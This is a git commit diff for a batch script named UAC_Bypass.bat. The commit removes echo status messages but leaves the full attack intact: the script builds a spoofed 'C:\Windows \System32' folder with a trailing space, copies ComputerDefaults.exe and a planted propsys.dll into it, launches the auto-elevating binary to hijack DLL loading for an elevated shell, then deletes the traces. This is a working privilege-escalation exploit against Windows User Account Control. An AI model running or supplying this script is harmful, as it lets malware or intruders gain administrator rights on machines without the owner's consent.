4420bfea3031d36704a98d1baf4ddcdcf9ce1a26
dalemazza <66513243+dalemazza@users.noreply.github.com>
2025-01-22 22:28:25 +0000

    Update UAC_Bypass.bat

--- UAC_Bypass.bat
+++ UAC_Bypass.bat
@@ -2,13 +2,10 @@
 
 mkdir "\\?\C:\Windows " 
 mkdir "\\?\C:\Windows \System32"
-echo  [+] file copying ...
 copy "C:\Windows\System32\ComputerDefaults.exe" "C:\Windows \System32\"
-echo  [+] file copying ...
 copy "propsys.dll" "C:\Windows \System32\"
 del "propsys.dll"
 "C:\Windows \System32\ComputerDefaults.exe"
-echo  [-] Got Elevated Shell........ ?
 
 @echo off
 del /q "C:\Windows \System32\*"
